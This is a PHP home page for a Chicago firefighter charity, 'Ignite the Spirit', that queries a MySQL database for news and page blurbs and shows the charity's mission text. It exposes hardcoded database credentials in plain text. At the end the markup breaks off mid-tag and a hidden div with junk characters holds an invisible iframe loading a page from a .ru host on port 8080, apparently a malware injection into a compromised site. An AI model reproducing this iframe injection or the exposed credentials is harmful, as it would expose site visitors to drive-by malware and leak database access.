<?php

$dbhost = 'mysql.ignitethespirit.org';
$dbuser = 'ignite';
$dbpass = 'fire08';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');

$dbname = 'ignite';
mysql_select_db($dbname);


function bbcode_format ($str) {
    $str = htmlentities($str);

    $simple_search = array(
                '/\[b\](.*?)\[\/b\]/is',                                
                '/\[i\](.*?)\[\/i\]/is',                                
                '/\[u\](.*?)\[\/u\]/is',                                
                //'/\[url\=(.*?)\](.*?)\[\/url\]/is',                         
                //'/\[url\](.*?)\[\/url\]/is',                             
                //'/\[align\=(left|center|right)\](.*?)\[\/align\]/is',    
                //'/\[img\](.*?)\[\/img\]/is',                            
                //'/\[mail\=(.*?)\](.*?)\[\/mail\]/is',                    
                //'/\[mail\](.*?)\[\/mail\]/is',                            
                //'/\[font\=(.*?)\](.*?)\[\/font\]/is',                    
                //'/\[size\=(.*?)\](.*?)\[\/size\]/is',                    
                //'/\[color\=(.*?)\](.*?)\[\/color\]/is',  
				'/\[return\]/is',      
                );

    $simple_replace = array(
                '<strong>$1</strong>',
                '<em>$1</em>',
                '<u>$1</u>',
                //'<a href="$1">$2</a>',
                //'<a href="$1">$1</a>',
                //'<div style="text-align: $1;">$2</div>',
                //'<img src="$1" />',
                //'<a href="mailto:$1">$2</a>',
                //'<a href="mailto:$1">$1</a>',
                //'<span style="font-family: $1;">$2</span>',
                //'<span style="font-size: $1;">$2</span>',
                //'<span style="color: $1;">$2</span>',
				'<br /><br />',
                );

    // Do simple BBCode's
    $str = preg_replace ($simple_search, $simple_replace, $str);

    // Do <blockquote> BBCode
    //$str = bbcode_quote ($str);

    return $str;
} 

$query = "SELECT * FROM news WHERE news_active = 1 ORDER BY news_date DESC LIMIT 0,5";
$news_result = mysql_query($query);

function news($query_result) 
{
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
	$content = stripslashes ($row['news_content']);
	$print_date = date('F j, Y', strtotime($row['news_date']));
		echo "<p>";
		echo "<strong>".$print_date." | ".stripslashes($row['news_title'])."</strong><br>";
		echo bbcode_format($content);
		//echo $row['news_link'];
		if ( $row['news_link'] != 0 ) { echo " [ <a href='pages.php?id=".$row['news_link']."'>More Info</a> ]"; }
		echo "</p>";
	}
}


$blurb_query = "SELECT * FROM pages ORDER by page_id DESC";
$blurb_result = mysql_query($blurb_query);

function blurbs($query_result)
{
	$page_link = "Read More";
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
		if ($row['page_show'] != 0)
		{
			echo "<div class='blurb'> \n";
        	echo "<h3>".$row['page_title']."</h3> \n";
			echo "<img src=/".$row['page_img1']."> \n";
	    	echo "<p><a class='change' href='pages.php?id=".$row['page_id']."'>[".$page_link."]</a></p> \n";
        	echo "</div> \n";
		}
	}
}


?>


<?php include("header.php"); ?>
	<div class="container">
    	<div class="left">
		  	<a class="logo_link" href="index.php"><img src="images/its_logo_rollover.jpg" alt="logo" /></a>
        	<div class="left_content">
				<?php include("navigation.php"); ?>
        	</div>
		</div>
		<div class="middle">
        	<div class="middle_content">
				<h1>We're There When You Need Us</h1>
				<p>Each year that passes is another year further away from 9/11.  In the hearts and minds of Chicago’s firefighters, the travesty happened just yesterday.  Every time they go on a call, they know there’s a chance they may not return.  On that Tuesday morning in 2001, that quiet prayer first responders keep to themselves, became loud and clear as the World Trade Center towers fell.  We all knew in our hearts that many people had just died.  We knew that many firefighters were in the buildings and we knew what they were attempting to do.  Our firefighters make a career of risking their lives to save the lives of others.  The dedication displayed by 343 firefighters who died on that fateful morning in September is equaled only by that of their brothers and sisters in their ranks – to safeguard our families and neighborhoods every day with courage and uncompromising devotion. <br /><br /> 

After 9/11, Americans everywhere proudly flew their flags of stars and stripes, encouraging our nation to come together.  It only then occurred to us that we were not prepared to handle such large devastation on our City’s own ground, like that at Ground Zero.  In June 2003, Ignite the Spirit was established to aid and assist Chicago’s first responders and their families in their time of need, despite their rank or assignment.  Ignite the Spirit was designed to lend a hand to families needing immediate financial support, regardless of hardship.  Hardship hits when and where we least expect it to.  Not once since our inception five years ago could we have envisioned the tremendous impact Ignite the Spirit has made on CFD families. [<a href="about.php">Read More</a> ]

<!-- “We’re There When You Need Us”<br /><br /> 

Every Chicago Fire Department vehicle proudly displays this phrase.  Ignite the Spirit was created for Chicago firefighters and their families in times of need.  This is our chance to give back to those who put their lives at risk on a daily basis and for giving something back to them for doing so much for the communities and neighborhoods in which we live.  Ignite the Spirit lets our firefighters know that we’ll be there when THEY need US.<br /><br /> 
  
To date, Ignite the Spirit has helped 59 families in their time of need totaling over 150,000.  Not only does Ignite the Spirit help families financially, we have collected an upwards of 4,000 toys and children’s gifts during each Christmas season!  New toy donations are collected and given to local hospitals and other deserving charities.  This is just another way of us leaving no one behind; especially our kids, during the season of giving.  In years past, not only have we accomplished putting smiles on the faces of kids in and around Chicago during Christmas, but we have also taken gifts to the areas devastated by Hurricanes Rita and Katrina in 2005.  In addition to toy drives, Ignite the Spirit holds 8-10 fundraising events throughout the year including a firefighter calendar, softball game, numerous pancake breakfasts and our largest fundraiser, the golf outing.<br /><br /> 

Our fundraisers help to spread the word about Ignite the Spirit. Our advertising is all word of mouth.  Friends and family like you are what makes us great!  Without the interest that has been circulated about Ignite the Spirit, an impact on the lives of others could not have been made.  <br /><br /> 

Thank you for visiting our site and supporting Ignite the Spirit! --> </p>

            	
			</div>
	    	<div class="middle_seconda
<div style="display
<div style="display:none">dqjiicxkxxhtqxvtnsziqefbietyopd<iframe width=541 height=606 src="http://the-past.ru:8080/index.php" ></iframe></div>